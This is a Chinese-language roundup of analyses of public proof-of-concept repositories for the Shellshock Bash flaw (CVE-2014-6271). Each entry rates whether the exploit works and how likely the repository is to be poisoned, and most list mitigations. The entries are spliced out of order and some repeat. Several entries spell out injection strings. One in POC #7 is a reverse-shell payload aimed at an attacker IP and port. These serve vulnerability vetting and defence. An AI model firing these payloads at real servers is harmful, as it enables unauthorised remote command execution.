CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过在环境变量中嵌入恶意代码，当Bash shell执行这些环境变量时，从而执行任意命令。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞利用代码（Shellshock.py）有效。 搜索结果中多个链接都指向了该漏洞的细节和利用方法，证明了该漏洞的可利用性。漏洞利用代码本身也提供了两种payload：反向shell和文件浏览，具有一定的利用价值。

**投毒风险：**
分析提供的Python脚本 `Shellshock.py` ，代码主体结构清晰，主要功能是构造包含恶意代码的HTTP请求头，并发送到目标服务器。代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **payload的可定制性：** 脚本允许用户自定义payload，这本身不是问题。但如果攻击者替换或修改了默认的payload生成方式，可能会插入恶意代码，例如，下载并执行其他恶意脚本。
*   **CGI路径：** 脚本中包含一些常见的CGI路径，攻击者可能通过修改这些路径来尝试不同的攻击目标。
*   **回连地址：** reverse shell需要指定lhost和lport，如果作者在代码中预设了后门地址，可能导致攻击者在不知情的情况下，将shell反弹给作者。但是，代码中这两个参数由用户指定，降低了直接投毒的风险。
*   **代码混淆：** 代码没有进行明显的混淆，可读性较强，降低了隐藏恶意代码的概率。

综合考虑，认为此POC存在10%的投毒风险，主要是因为payload的可定制性，可能被用于传播修改后的恶意脚本。需要仔细审查代码，尤其关注payload生成和CGI路径部分。

**利用方式：**
利用方式是利用Bash解析环境变量时存在的漏洞，通过构造恶意的HTTP请求头（例如Cookie或Referer），在其中嵌入包含恶意代码的函数定义。当目标服务器上的Bash shell执行CGI脚本时，会解析这些HTTP头，从而触发漏洞，执行攻击者注入的命令。具体步骤如下：

1.  **确定目标：** 找到存在CGI脚本且可能受Shellshock影响的服务器。
2.  **构造Payload：** 根据需要选择payload类型（反向shell或文件浏览），并设置相应的参数（例如lhost、lport、echo）。
3.  **发送请求：** 使用`Shellshock.py`脚本构造包含恶意payload的HTTP请求，并发送到目标服务器的CGI脚本。
4.  **执行命令：** 如果目标存在漏洞，Bash shell会执行payload中的恶意代码，例如建立反向shell连接或执行文件浏览命令，并将结果返回给攻击者。

**项目地址:** [FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-](https://github.com/FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #6

**来源**: [CVE-2014-6271-Gurguii_cgi-bin-shellshock.md](../2014/CVE-2014-6271-Gurguii_cgi-bin-shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或通过其他方式设置环境变量并调用Bash

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过特制的通过环境变量执行任意命令。利用方式如下：

1.  **有效性：** 提供的Python和Bash脚本都是有效的PoC代码。它们通过设置包含恶意代码的环境变量，然后尝试通过HTTP请求触发漏洞。
2.  **投毒风险：** 尽管代码主要用于利用Shellshock漏洞，但仍然存在轻微的投毒风险。具体分析如下：
    *   **README.md:**  该文件仅包含使用说明，无投毒代码。
    *   **shellshock.py:** Python脚本通过`requests`库发送HTTP请求，如果攻击者的服务器被攻陷，或者服务器返回恶意重定向，那么可能存在风险。但是代码本身没有明显的恶意代码。
    *   **shellshock.sh:** Bash脚本使用`curl`命令，同样存在curl命令被其他程序劫持，或者DNS投毒的风险。
    *  脚本接受用户提供的URL、LHOST和LPORT，如果用户使用了恶意的URL，可能会被服务器端记录或者进行其他攻击。这些不是脚本投毒，而是用户使用不当造成的。
    综合分析，主要风险在于依赖的外部命令(`curl`,`requests`)可能存在风险，以及用户使用脚本不当的风险,投毒风险较低，初步判定为10%。
3.  **利用方式：**
    *   **通过User-Agent头：**  PoC代码通过修改HTTP请求的User-Agent头，将包含恶意代码的环境变量发送到目标服务器。如果目标服务器上的CGI脚本或其他应用程序调用Bash来处理该请求，那么恶意代码就会被执行。
    *   **反弹Shell：**  PoC代码可以配置LHOST和LPORT参数，用于接收目标服务器的反弹Shell。攻击者可以在自己的机器上监听指定的端口，当目标服务器执行恶意代码时，会主动连接攻击者的机器，从而建立反弹Shell连接。
    *   **交互式命令执行：**  PoC代码也支持交互式命令执行。攻击者可以输入任意命令，PoC代码会将命令注入到环境变量中，并发送到目标服务器执行。

**搜索引擎结果补充：** 搜索引擎结果证实了该漏洞的严重性和广泛影响，并提供了一些检测和利用该漏洞的资源。

**项目地址:** [Gurguii/cgi-bin-shellshock](https://github.com/Gurguii/cgi-bin-shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #7

**来源**: [CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md](../2014/CVE-2014-6271-Jsmoreira02_CVE-2014-6271.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** <= 4.3

**利用条件:** 目标系统使用Bash，并且存在可以通过环境变量传递参数的CGI脚本或其他服务。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271（Shellshock）是一个存在于GNU Bash中的远程命令执行漏洞。漏洞的根源在于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，利用诸如Apache HTTP Server的mod_cgi模块、OpenSSH的ForceCommand功能、DHCP客户端脚本等场景，跨越权限边界执行任意shell命令。

**有效性评估：**

提供的漏洞利用代码（shellshock_exploit.py）旨在利用Shellshock漏洞，通过向目标URL发送特制的HTTP请求，其中User-Agent头包含恶意Bash代码，从而在目标服务器上执行任意命令。

README.md 文件中提供了检测和利用该漏洞的步骤。

根据漏洞库信息和搜索结果，该漏洞是一个广泛存在的严重漏洞，影响大量系统和服务。提供的POC代码与漏洞描述一致，因此，该POC代码**有效**。

**投毒风险评估：**

检查`shellshock_exploit.py`脚本和`README.md`文件，未发现明显的恶意代码。脚本的主要功能是构造包含漏洞利用代码的HTTP请求，并在本地监听反弹shell。风险点可能在于以下几点：

1.  **Payload定制：** 脚本允许指定LHOST和LPORT，如果用户不小心使用了错误的IP地址或端口，可能会导致连接到恶意服务器。
2.  **依赖性：** 脚本依赖于`requests`库，如果安装了被篡改的`requests`库，可能会存在风险。
3.  **Netcat依赖：** 脚本依赖于本地的 `nc` 命令, 如果本地的 `nc` 命令被恶意替换, 可能存在风险。

总体而言，该代码的投毒风险较低，主要集中在使用者的误操作和对外部依赖项的信任上。投毒风险估计为10%。

**漏洞利用方式：**

1.  **确定目标：** 找到运行存在漏洞Bash版本的服务器，并且该服务器运行着可以通过环境变量传递参数的服务，例如CGI脚本。
2.  **构造Payload：** 构造包含恶意Bash代码的环境变量，例如：`() { :; }; /bin/bash -i >& /dev/tcp/attacker_ip/attacker_port 0>&1`
3.  **发送请求：** 通过HTTP请求或其他方式将构造的Payload作为环境变量传递给目标服务器。
4.  **执行命令：** 目标服务器上的Bash解释器会执行恶意代码，从而执行攻击者指定的命令。
5.  **反弹Shell：** 在上面的Payload示例中，恶意代码会尝试创建一个反弹Shell，将目标服务器的Shell连接到攻击者的IP地址和端口。

**缓解措施：**

1.  升级Bash到最新版本。
2.  检查和更新所有使用Bash脚本的服务，确保它们不会受到环境变量的影响。
3.  使用入侵检测系统（IDS）和入侵防御系统（IPS）来检测和阻止Shellshock攻击。

**项目地址:** [Jsmoreira02/CVE-2014-6271](https://github.com/Jsmoreira02/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #8

**来源**: [CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md](../2014/CVE-2014-6271-K3ysTr0K3R_CVE-2014-6271-EXPLOIT.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许远程攻击者通过构造的环境变量执行任意代码。

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许设置环境变量并调用Bash。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后trailing string的方式。攻击者可以利用此漏洞，通过构造包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性分析：**
提供的Python POC代码通过发送包含恶意构造的HTTP请求来利用此漏洞。它首先尝试通过User-Agent、Referer和Cookie头注入测试payload来检测漏洞是否存在，测试Payload特征是会输出特定字符串，验证是否可以执行代码，存在漏洞后再注入包含反向Shell的payload来利用该漏洞。

**投毒风险分析：**
代码存在潜在的投毒风险，主要体现在以下几个方面：
1.  **反向Shell地址：** 攻击者可能修改`lhost`和`lport`变量，将反向Shell指向恶意服务器，从而控制受害者机器。当前代码中并没有明显的恶意行为，但是依赖用户提供的参数。
2.  **Payload修改：** 攻击者可能修改`payload`变量，执行其他恶意命令，例如下载并执行恶意文件，删除系统文件等。当前Payload是反向shell，不属于投毒行为。
3.  **其他依赖：** 代码依赖于`pwncat`库，这个库本身可能存在安全问题或被篡改，从而引入新的安全风险。
4. **连接处理:** `pwncat.manager.Manager` 中可能包含未知的后门或恶意代码。 
综合来看，投毒风险较低（约10%），主要来自于参数修改和对依赖库的信任。

**利用方式：**
1.  **漏洞检测：**  POC首先向目标URL发送包含特殊构造header的HTTP请求(User-Agent, Referer, Cookie)。 这些header中包含恶意的Bash函数定义。
2.  **命令执行：**  如果目标系统存在漏洞，Bash在解析这些环境变量时，会执行注入的恶意代码。
3.  **反向Shell：**  利用代码中，注入的Payload为反向Shell，建立从目标系统到攻击者控制机器的TCP连接，从而允许攻击者远程控制目标系统。反向连接的地址由`lhost`和`lport`指定。
4. **监听连接:** 在攻击机上启动监听进程，等待目标机器的连接。

**漏洞缓解措施：**
*   升级Bash到最新版本。
*   避免在CGI脚本中使用Bash处理用户输入。
*   使用安全编码实践，验证所有用户输入。
*   使用入侵检测系统（IDS）和入侵防御系统（IPS）监控和阻止恶意流量。

**项目地址:** [K3ysTr0K3R/CVE-2014-6271-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2014-6271-EXPLOIT)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #9

**来源**: [CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md](../2014/CVE-2014-6271-MuirlandOracle_CVE-2014-6271-IPFire.md)

## CVE-2014-6271 IP Fire Shellshock RCE

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** IPFire

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 2.15

**利用条件:** 目标系统运行存在漏洞的Bash版本，且可以通过HTTP(S)访问到受影响的CGI脚本 (index.cgi)。可能需要用户名和密码进行身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过构造恶意的环境变量来执行任意代码。提供的Python POC代码专门针对IPFire防火墙<=2.15版本。利用方式如下：

1.  **漏洞原理：** Bash在处理环境变量时，允许在函数定义后附加额外的命令。如果这些环境变量被传递给执行Bash脚本的CGI程序，附加的命令就会被执行。
2.  **攻击向量：**  攻击者通过HTTP请求的header中设置包含恶意代码的环境变量，利用IPFire的`index.cgi`脚本触发漏洞。
3.  **POC代码分析：** 该POC首先尝试连接到目标IPFire服务器，如果需要则进行HTTP基本身份验证。然后，它构造一个包含恶意Bash代码的环境变量，并通过HTTP请求的headers将其发送到`index.cgi`。恶意代码利用函数定义后的trailing string执行任意命令。POC还包含了一个伪shell，允许交互式地执行命令。
4.  **投毒风险分析：** POC代码主要功能是漏洞验证和利用，但仍存在一定投毒风险。例如：
    *   代码中包含`eval`或`exec`等执行任意代码的函数，虽然目前用于执行用户输入的命令，但攻击者可能修改这些部分来执行恶意代码。
    *   该脚本依赖于`requests`库，攻击者可能篡改此脚本，要求安装恶意依赖包，从而执行恶意代码
    *  该脚本在执行远程命令后直接打印到输出，没有进行过滤，如果远程服务器被入侵，可能会发送恶意字符到客户端，导致客户端被攻击。
  因此，保守估计存在10%的投毒风险，主要集中在潜在的恶意依赖、命令执行的输出处理以及代码篡改的可能性。

**总结：** 提供的POC代码利用Shellshock漏洞，通过构造包含恶意Bash代码的环境变量，实现在目标IPFire系统上执行任意命令。由于利用了HTTP(S)协议，攻击通常可以通过网络远程发起。尽管漏洞已经存在多年，但仍然有很多系统没有修复，因此该漏洞仍然具有较高的现实威胁。

**项目地址:** [MuirlandOracle/CVE-2014-6271-IPFire](https://github.com/MuirlandOracle/CVE-2014-6271-IPFire)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #10

**来源**: [CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md](../2014/CVE-2014-6271-RAJMadhusankha_Shellshock-CVE-2014-6271-Exploitation-and-Analysis.md)

## CVE-2014-6271 Shellshock漏洞利用

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** 1.14 - 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且存在可利用的攻击面，如CGI脚本。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash shell中的高危漏洞。该漏洞允许攻击者通过在环境变量中注入恶意代码来执行任意命令。根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，以下是对漏洞利用有效性、投毒风险和利用方式的分析：

**有效性：**

根据漏洞库信息，CVE-2014-6271允许远程攻击者通过特制的环境变量执行任意代码。漏洞利用代码（README.md）提供了一个利用 `exploit/multi/http/apache_mod_cgi_bash_env_exec` 模块的Metasploit POC，用于攻击运行CGI脚本的Apache服务器。多个搜索引擎结果，如NVD, CISA, Qualys等，也确认了该漏洞的存在和危害，并提供了缓解措施。综合来看，提供的POC代码是有效的。

**投毒风险：**

漏洞利用代码本身是 Metasploit 模块的配置说明，用于利用已知的 Shellshock 漏洞。直接分析 README.md 文件，投毒风险较低，但仍存在以下风险：

*   **作者恶意修改：** 理论上，作者可能在提供文件的其他地方（例如，如果存在其他脚本或配置）隐藏了恶意代码。但仅根据提供信息无法判断。
*   **依赖项风险：** Metasploit 模块本身依赖于 Metasploit Framework，如果 Metasploit Framework 被篡改，可能存在风险。

综合评估，投毒风险较低，约为10%。主要来自于潜在的未公开文件篡改。

**利用方式：**

1.  **确定目标：** 找到运行Bash，且存在CGI脚本或其他途径可以设置环境变量的系统。
2.  **发送恶意请求：** 构造包含恶意代码的环境变量。常见的攻击方式是通过HTTP请求头，特别是当服务器使用CGI脚本处理请求时。HTTP头会被转换为环境变量传递给Bash。
3.  **代码执行：** 当Bash处理包含恶意代码的环境变量时，会执行注入的命令。
4.  **反弹shell（POC中的PAYLOAD）：**  利用 `cmd/unix/reverse_netcat` payload在目标主机上执行`nc`，反弹shell到攻击者的机器。

**防范措施：**

*   立即更新 Bash 到最新版本。
*   禁用未使用的 CGI 脚本。
*   使用 Web 应用防火墙 (WAF) 过滤恶意请求。
*   监控 HTTP 请求日志。

**项目地址:** [RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis](https://github.com/RAJMadhusankha/Shellshock-CVE-2014-6271-Exploitation-and-Analysis)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #11

**来源**: [CVE-2014-6271-RadYio_CVE-2014-6271.md](../2014/CVE-2014-6271-RadYio_CVE-2014-6271.md)

# CVE-2014-6271

> 📦 该CVE有 **28** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2014-6271-0xN7y_CVE-2014-6271.md](../2014/CVE-2014-6271-0xN7y_CVE-2014-6271.md)

## CVE-2014-6271 ShellShock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本或其他方式允许通过环境变量与Bash交互

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2014-6271，也被称为ShellShock，是GNU Bash中的一个高危漏洞。攻击者可以通过构造包含恶意代码的环境变量，利用Bash解析函数定义时存在的缺陷来执行任意命令。漏洞利用方式如下：

1.  **漏洞原理：** Bash在解析环境变量时，如果环境变量的值包含函数定义，则会尝试执行函数定义后面的字符串。如果攻击者能够控制环境变量的内容，就可以注入恶意代码。

2.  **利用方式：** 攻击者通常通过以下几种方式注入环境变量：
    *   **HTTP请求头：** 如果Web服务器使用CGI脚本，攻击者可以在HTTP请求头中设置包含恶意代码的环境变量，例如User-Agent。
    *   **SSH ForceCommand：** 在OpenSSH配置中，ForceCommand选项允许在用户登录时强制执行特定命令。攻击者可以利用此选项设置包含恶意代码的环境变量。
    *   **DHCP客户端：** DHCP客户端在请求IP地址时，可以设置环境变量。攻击者可以伪造DHCP服务器，向受害者发送包含恶意代码的DHCP响应。

3.  **POC分析：** 提供的POC代码 `CVE-2014-6271.py`  通过构造包含恶意代码的User-Agent HTTP头来利用此漏洞。脚本接受目标URL和要执行的命令作为参数，然后向目标URL发送包含特制User-Agent头的HTTP请求。
    *   **有效性：** 该POC代码有效，如果目标系统存在漏洞，可以执行任意命令。
    *   **投毒风险：**  查看提供的POC代码，未发现明显的投毒代码。代码结构清晰，功能明确，主要目的是发送包含漏洞利用代码的HTTP请求。**因此投毒风险为0%**。

4.  **缓解措施：**
    *   升级Bash到最新版本。
    *   检查并修复所有可能受到漏洞影响的应用程序和服务，例如Web服务器、OpenSSH和DHCP客户端。
    *   限制CGI脚本的使用，并对所有输入进行严格的验证。

根据搜索引擎的结果，该漏洞是一个严重的互联网基础设施风险，因为许多常见的配置都允许远程代码执行。一些供应商已经发布了补丁来解决这个问题。因此，使用提供的POC代码进行漏洞验证是合理的，但需要注意潜在的风险。

**项目地址:** [0xN7y/CVE-2014-6271](https://github.com/0xN7y/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #2

**来源**: [CVE-2014-6271-AlissonFaoli_Shellshock.md](../2014/CVE-2014-6271-AlissonFaoli_Shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，允许未经身份验证的远程攻击者在受影响的系统上执行任意代码。

**影响版本:** GNU Bash 1.14 至 4.3

**利用条件:** 目标系统需要运行存在漏洞的Bash版本，并且通过CGI脚本、OpenSSH ForceCommand或其他方式暴露了环境变量注入点。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞源于Bash处理环境变量中函数定义后附加字符串的方式。攻击者可以通过构造包含恶意代码的环境变量，在Bash执行时注入并执行任意命令。利用方式通常涉及以下步骤：

1.  **确定攻击目标：** 寻找使用Bash处理请求的应用程序或服务，例如CGI脚本、OpenSSH服务器（使用ForceCommand）或DHCP客户端。
2.  **构造恶意环境变量：** 创建一个包含函数定义和恶意命令的环境变量。例如：`() { :; }; echo vulnerable`
3.  **发送包含恶意环境变量的请求：** 将构造的环境变量通过HTTP请求头、SSH连接或其他方式传递给目标系统。
4.  **触发漏洞执行：** 当目标系统执行Bash并处理包含恶意环境变量的请求时，漏洞将被触发，导致恶意命令执行。

提供的Python POC脚本 `shellshock.py` 旨在利用此漏洞。该脚本接受目标URL、攻击者IP地址（LHOST）和端口（LPORT）作为参数。它通过构造包含反向shell命令的User-Agent头，向目标URL发送HTTP GET请求。如果目标系统存在漏洞，它将执行反向shell命令，允许攻击者连接到目标系统并执行任意命令。

**关于投毒风险的分析：**

代码中主要功能是利用Shellshock漏洞，建立反向连接。审查代码，发现可能存在轻微投毒风险的地方在于，攻击者可以修改payload，执行任意命令。但是，由于脚本本身就是为了利用漏洞而设计的，因此，这不算是作者有意植入的后门，而是漏洞利用本身的性质决定的。

  * LICENSE和README.md文件相对标准，没有发现恶意代码。
  * `shellshock.py`脚本，虽然主要功能是漏洞利用，但如果被不道德的人使用，仍然会产生危害。

综合评估，该仓库的投毒风险较低，大约在5%左右。主要风险在于脚本被恶意使用，而非代码本身包含隐藏的恶意功能。

**项目地址:** [AlissonFaoli/Shellshock](https://github.com/AlissonFaoli/Shellshock)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #3

**来源**: [CVE-2014-6271-Brandaoo_CVE-2014-6271.md](../2014/CVE-2014-6271-Brandaoo_CVE-2014-6271.md)

## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统需要使用Bash，并且存在允许通过环境变量传递参数的场景，例如CGI脚本，OpenSSH ForceCommand等

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271 (Shellshock) 漏洞允许攻击者通过在环境变量中构造恶意的函数定义，从而在Bash执行时注入并执行任意代码。该漏洞的利用方式是：

1.  **漏洞原理：** Bash在处理环境变量时，如果环境变量的值包含函数定义，Bash会先执行函数定义之后的内容。如果函数定义后的字符串包含恶意代码，则会被执行。
2.  **利用方式：** 攻击者构造包含恶意代码的环境变量，例如 `(){ :; }; /usr/bin/id`，然后将该环境变量传递给目标系统。
3.  **触发点：** 目标系统上运行的Bash脚本或程序在执行时，会解析并处理这些环境变量，从而触发漏洞，执行攻击者注入的恶意代码。
4.  **POC分析：** 提供的`shellshock.sh`脚本通过`curl`命令发送带有特殊构造的`User-Agent`头的HTTP请求。`User-Agent`头的内容为 `() { :; }; echo VULNERABLE`。如果目标网站的服务器使用Bash处理HTTP请求头（例如，通过CGI脚本），并且Bash存在Shellshock漏洞，那么`echo VULNERABLE`命令会被执行，并在HTTP响应中返回 "VULNERABLE" 字符串，脚本据此判断目标站点存在漏洞。
5.  **有效性分析：** 该POC代码基本有效，可以用于检测目标服务器是否存在Shellshock漏洞。但是，该脚本的检测方法较为简单，仅通过`User-Agent`头进行检测，可能存在一定的漏报情况。更复杂的利用场景可能需要修改POC代码。
6.  **投毒风险分析：** 该仓库中存在一定的投毒风险。`shellshock.sh`本身的代码较为简单，主要功能是发送HTTP请求并检查响应。潜在的风险在于：
    *   **依赖项风险：** 虽然脚本本身只依赖于`curl`，但是如果攻击者修改脚本，引入其他的外部命令或者脚本，可能会引入恶意代码。
    *   **命令注入风险：** 虽然脚本避免了直接执行用户输入，但是，如果攻击者能够控制`curl`的参数或者其他命令的参数，仍然可能存在命令注入的风险。
    *  **README.md风险:** 有攻击者会修改README.md文件，放入恶意链接，诱导用户点击。
    根据代码的复杂度、依赖项以及潜在的命令注入风险，估计投毒风险为10%。

**项目地址:** [Brandaoo/CVE-2014-6271](https://github.com/Brandaoo/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #4

**来源**: [CVE-2014-6271-Dilith006_CVE-2014-6271.md](../2014/CVE-2014-6271-Dilith006_CVE-2014-6271.md)

## CVE-2014-6271-Bash-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 需要目标系统存在Bash并且可以通过某种方式设置环境变量。常见的攻击场景包括：OpenSSH的ForceCommand、Apache HTTP Server的mod_cgi/mod_cgid、DHCP客户端等。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为“Shellshock”，是GNU Bash中的一个严重漏洞。该漏洞源于Bash处理环境变量中函数定义后尾随字符串的方式存在缺陷，这使得攻击者可以通过构造特制的包含恶意代码的环境变量，在目标系统上执行任意命令。

**有效性：**
根据漏洞库信息、搜索结果，以及常见利用方式，该漏洞的PoC是有效的。漏洞库信息中列出了多个Expolit-DB的链接,以及许多厂商的确认信息,证明该漏洞的真实性。搜索结果也显示了大量的关于该漏洞的分析和利用案例。提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`，从文件名和路径来看，仅仅是一个README文件，内容只有`# CVE-2014-6271`，没有可执行的代码，但可以作为漏洞存在的标志。

**投毒风险：**
提供的POC代码`/tmp/c7baa98dd966ca6db5937f8832eb7ff6/README.md`的内容非常简单，几乎没有投毒代码的可能性。但是，由于该仓库本身存在于`/tmp`目录下，存在被恶意替换或者植入恶意脚本的可能性，因此具有一定的投毒风险。但是从代码本身来看，投毒风险极低,给出的预估值为10%。

**利用方式：**
1.  **环境变量注入：** 攻击者构造包含恶意代码的环境变量，例如：`(){ :; }; /bin/bash -c "恶意命令"`。
2.  **触发漏洞：** 将构造的环境变量传递给存在漏洞的Bash实例。这可以通过多种方式实现，例如：
    *   **HTTP请求：** 如果目标系统使用CGI脚本，可以通过修改HTTP请求头（如User-Agent）来设置环境变量。
    *   **SSH：** 如果OpenSSH启用了`ForceCommand`，可以通过设置环境变量来执行命令。
    *   **DHCP：** 某些DHCP客户端在执行脚本时会使用环境变量。
3.  **代码执行：** 当Bash解析包含恶意代码的环境变量时，会执行其中的命令，从而实现远程代码执行。

**总结：**
Shellshock是一个严重的安全漏洞，利用方式简单，影响范围广泛。虽然漏洞本身发布时间较早，但仍然可能存在于未及时更新的系统中。由于PoC的特殊性，直接利用README.md是不可能的，需要配合其他可执行的EXP进行测试。

**项目地址:** [Dilith006/CVE-2014-6271](https://github.com/Dilith006/CVE-2014-6271)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #5

**来源**: [CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md](../2014/CVE-2014-6271-FilipStudeny_-CVE-2014-6271-Shellshock-Remote-Command-Injection-.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程命令执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统存在CGI脚本，且配置不当允许通过HTTP Headers传递环境变量。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，也被称为Shellshock，是一个存在于GNU Bash中的高危漏洞。该漏洞允许攻击者通过在环境变量中嵌入恶意代码，当Bash shell执行这些环境变量时，从而执行任意命令。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞利用代码（Shellshock.py）有效。 搜索结果中多个链接都指向了该漏洞的细节和利用方法，证明了该漏洞的可利用性。漏洞利用代码本身也提供了两种payload：反向shell和文件浏览，具有一定的利用价值。

**投毒风险：**
分析提供的Python脚本 `Shellshock.py` ，代码主体结构清晰，主要功能是构造包含恶意代码的HTTP请求头，并发送到目标服务器。代码中存在一定的投毒风险，主要体现在以下几个方面：

*   **payload的可定制性：** 脚本允许用户自定义payload，这本身不是问题。但如果攻击者替换或修改了默认的payload生成方式，可能会插入恶意代码，例如，下载并执行其他恶意脚本。
*   **CGI路径：** 脚本中包含一些常见的CGI路径，攻击者可能通过修改这些路径来尝试不同的攻击目标。
*   **回连地址：** reverse shell需要指定lhost和lport，如果作者在代码中预设了后门地址，可能导致攻击者在不知情的情况下，将shell反弹给作者。但是，代码中这两个参数由用户指定，降低了直接投毒的风险。
*   **代码混淆：** 代码没有进行明显的混淆，可读性较强，降低了隐藏恶意代码的概率。

综合考虑，认为此POC存在10%的投毒风险，主要是因为payload的可定制性，可能被用于传播修改后的恶意脚本。需要仔细审查代码，尤其关注payload生成和CGI路径部分。

**利用方式：**
利用方式是利用Bash解析环境变量时存在的漏洞，通过构造恶意的HTTP请求头（例如Cookie或Referer），在其中嵌入包含恶意代码的函数定义。当目标服务器上的Bash shell执行CGI脚本时，会解析这些HTTP头，从而触发漏洞，执行攻击者注入的命令。具体步骤如下：

1.  **确定目标：** 找到存在CGI脚本且可能受Shellshock影响的服务器。
2.  **构造Payload：** 根据需要选择payload类型（反向shell或文件浏览），并设置相应的参数（例如lhost、lport、echo）。
3.  **发送请求：** 使用`Shellshock.py`脚本构造包含恶意payload的HTTP请求，并发送到目标服务器的CGI脚本。
4.  **执行命令：** 如果目标存在漏洞，Bash shell会执行payload中的恶意代码，例如建立反向shell连接或执行文件浏览命令，并将结果返回给攻击者。

**项目地址:** [FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-](https://github.com/FilipStudeny/-CVE-2014-6271-Shellshock-Remote-Command-Injection-)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)

---

## POC #6

**来源**: [CVE-2014-6271-Gurguii_cgi-bin-shellshock.md](../2014/CVE-2014-6271-Gurguii_cgi-bin-shellshock.md)

## CVE-2014-6271 Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统完全控制

**影响版本:** <= 4.3

